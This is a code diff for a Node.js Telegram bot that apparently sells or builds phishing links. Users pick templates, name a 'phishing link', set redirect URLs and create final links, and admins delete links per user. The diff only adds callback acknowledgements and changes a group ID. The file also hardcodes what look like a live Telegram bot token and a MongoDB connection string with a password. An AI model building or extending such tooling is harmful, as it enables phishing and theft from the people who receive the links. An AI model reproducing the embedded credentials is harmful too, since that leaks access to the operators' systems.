@@ -11,7 +11,7 @@ const TOKEN = "8291862788:AAEvXOm7TSrCIjb1TxPm7rleiG_NooTgxdE"; // ⚠️ CHANGE
 const OWNER_IDS = [6703335929, 6041728084, 5136260272, 7089533955, 6125809347]; 
 const CHANNEL_ID1 = "@alphacodex369";
 const CHANNEL_ID2 = "@Termuxcodex";
-const GROUP_ID = "@code_x369"; 
+const GROUP_ID = "@code_marketx"; 
 const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/DEVICEX?retryWrites=true&w=majority"; 
 
 const START_IMG_URL = "https://graph.org/file/c3b658c9adaf0aba7153f-a22a3447d1410355a0.jpg";
@@ -541,15 +541,18 @@ bot.on('callback_query', async (query) => {
 
     if (await checkAdmin(fromId)) {
         if (data === "rm_guide") {
+            bot.answerCallbackQuery(query.id).catch(()=>{});
             return bot.sendMessage(chatId, `📌 <b>${_fnt("REMOVAL GUIDE")}:</b>\n\nTo delete specific links:\n<code>/rmlink [ID] 1 3</code>\n\nTo delete everything:\n<code>/rmlink [ID] all</code>`, {parse_mode:'HTML'});
         }
         if (data.startsWith("delall_")) {
             const target = data.split('_')[1];
             await Link.deleteMany({ creatorChatId: target });
+            bot.answerCallbackQuery(query.id).catch(()=>{});
             return bot.editMessageText(`✅ All links for <code>${target}</code> removed.`, { chat_id: chatId, message_id: msg.message_id, parse_mode: 'HTML' });
         }
         if (data.startsWith("prompt_del_")) {
             const uid = data.split('_')[2];
+            bot.answerCallbackQuery(query.id).catch(()=>{});
             return bot.sendMessage(chatId, `👉 Copy & Edit:\n<code>/rmlink ${uid} 1</code>`, {parse_mode:'HTML'});
         }
     }
@@ -605,7 +608,10 @@ bot.on('callback_query', async (query) => {
     }
 
     const user = await User.findOne({ chatId: fromId });
-    if (!user || user.isBanned) return;
+    if (!user || user.isBanned) {
+        bot.answerCallbackQuery(query.id).catch(()=>{});
+        return;
+    }
 
     if (data.startsWith("tpl_")) {
         const tplName = data.split("_")[1];
@@ -629,18 +635,22 @@ bot.on('callback_query', async (query) => {
         handleShare(chatId, user);
         return bot.answerCallbackQuery(query.id);
     } else if (data === 'create_custom') {
+        bot.answerCallbackQuery(query.id).catch(()=>{});
         if (!userState[chatId]) userState[chatId] = { template: 'Device' };
         userState[chatId].step = 'await_custom_name';
         bot.sendMessage(chatId, makeBorder("CUSTOM", `<b>✏️: ${_fnt("SEND YOUR PHISHING LINK NAME")}</b>`), { parse_mode: 'HTML' });
     } else if (data === 'create_random') {
+        bot.answerCallbackQuery(query.id).catch(()=>{});
         if (!userState[chatId]) userState[chatId] = { template: 'Device' };
         askRedirect(msg, Math.random().toString(36).substring(7));
     } else if (data === 'use_redirect') {
         if (!userState[chatId]) return bot.answerCallbackQuery(query.id, {text: "⚠️ Session Expired. Click create again."});
+        bot.answerCallbackQuery(query.id).catch(()=>{});
         userState[chatId].step = 'await_redirect_url';
         bot.sendMessage(chatId, makeBorder("REDIRECT", `<b>🌐: ${_fnt("SEND YOUR DESTINATION URL")}</b>`), { parse_mode: 'HTML' });
     } else if (data === 'no_redirect') {
         if (!userState[chatId]) return bot.answerCallbackQuery(query.id, {text: "⚠️ Session Expired."});
+        bot.answerCallbackQuery(query.id).catch(()=>{});
         createFinalLink(msg, userState[chatId].name, null);
     }
 });
